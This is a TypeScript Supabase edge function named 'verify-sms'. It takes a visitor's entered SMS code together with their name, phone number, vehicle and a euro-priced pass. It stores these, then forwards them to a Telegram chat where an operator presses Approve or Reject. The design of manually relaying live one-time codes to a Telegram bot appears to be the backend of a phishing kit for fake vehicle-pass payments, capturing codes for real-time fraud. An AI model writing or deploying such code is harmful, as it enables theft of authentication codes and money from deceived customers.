import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.57.4';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TelegramSettings {
  bot_token: string;
  info_chat_id: string;
  form_chat_id: string;
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL')!,
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!
    );

    const raw = await req.text();
    console.log('[verify-sms] incoming request meta:', {
      method: req.method,
      headers: Object.fromEntries(req.headers.entries()),
      rawBodyLength: raw?.length ?? 0,
      rawPreview: raw?.slice(0, 200)
    });

    let parsed: any = null;
    try {
      parsed = raw ? JSON.parse(raw) : null;
    } catch (e) {
      console.error('[verify-sms] JSON parse error:', e);
    }

    const { userId, code, customerInfo, vehicle, duration } = parsed || {};

    if (!userId || !code || !customerInfo || !vehicle || !duration) {
      return new Response(
        JSON.stringify({ success: false, message: 'Missing required parameters' }),
        { 
          status: 400, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
        }
      );
    }

    // Get telegram settings from database
    const { data: settings } = await supabase
      .from('settings')
      .select('value')
      .eq('key', 'telegram')
      .single();

    if (!settings) {
      console.error('No telegram settings found');
      return new Response(
        JSON.stringify({ success: false, message: 'Telegram not configured' }),
        { 
          status: 500, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
        }
      );
    }

    const telegramSettings = settings.value as TelegramSettings;
    console.log('Using bot token:', telegramSettings.bot_token ? 'Found' : 'Missing');

    // Generate verification ID
    const verificationId = `verify_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    // Store verification in database
    const { data: verificationData, error: dbError } = await supabase
      .from('verification_requests')
      .insert({
        verification_id: verificationId,
        user_id: userId,
        code: code,
        customer_info: customerInfo,
        vehicle: vehicle,
        duration: duration,
        status: 'pending'
      })
      .select()
      .single();

    if (dbError) {
      console.error('Database error:', dbError);
      return new Response(
        JSON.stringify({ success: false, message: 'Failed to store verification request' }),
        { 
          status: 500, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
        }
      );
    }

    // Send message to Telegram with admin buttons
    const message = `🔐 *SMS Verification Request*
    
👤 *Customer:* ${customerInfo.fullName}
📱 *Phone:* ${customerInfo.phone}
🔢 *Code Entered:* ${code}

🚗 *Vehicle:* ${vehicle.color} ${vehicle.make} ${vehicle.model}
🎫 *Pass:* ${duration.label}
💰 *Amount:* €${duration.discountedPrice.toFixed(2)}

Please verify if this code is correct:`;

    const keyboard = {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `verify_approve_${verificationId}` },
          { text: "❌ Reject", callback_data: `verify_reject_${verificationId}` }
        ]
      ]
    };

    const telegramResponse = await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: telegramSettings.form_chat_id,
        text: message,
        // No parse_mode: send as plain text to avoid entity parsing errors
        reply_markup: keyboard
      }),
    });

    if (!telegramResponse.ok) {
      const errorText = await telegramResponse.text();
      console.error('Telegram API error:', errorText);
      return new Response(
        JSON.stringify({ success: false, message: 'Failed to send Telegram message' }),
        { 
          status: 500, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
        }
      );
    }

    console.log('Verification request sent to Telegram:', verificationId);

    return new Response(
      JSON.stringify({ 
        success: true, 
        verificationId,
        message: 'Verification request sent to admin' 
      }),
      { 
        status: 200, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    );

  } catch (error) {
    console.error('Error in verify-sms function:', error);
    return new Response(
      JSON.stringify({ success: false, message: error.message }),
      { 
        status: 500, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    );
  }
});